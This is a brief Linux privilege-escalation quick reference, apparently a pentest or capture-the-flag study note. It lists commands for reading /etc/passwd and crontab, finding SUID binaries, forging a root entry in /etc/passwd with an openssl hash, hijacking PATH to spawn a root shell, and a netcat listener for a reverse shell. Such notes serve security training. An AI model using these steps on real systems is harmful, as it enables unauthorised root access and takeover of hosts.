# Linux PrivEsc — Quick Reference

## First Commands on Any System
whoami
id
sudo -l
uname -a
cat /etc/passwd
cat /etc/crontab
echo $PATH

## Find SUID Files
find / -perm -u=s -type f 2>/dev/null

## Create Password Hash
openssl passwd -1 -salt [salt] [password]

## /etc/passwd Root Entry Format
username:hash:0:0:root:/root:/bin/bash

## PATH Hijack
echo "/bin/bash" > /tmp/[command]
chmod +x /tmp/[command]
export PATH=/tmp:$PATH

## Catch Reverse Shell
nc -lvnp [port]

## References
gtfobins.github.io
github.com/rebootuser/LinEnum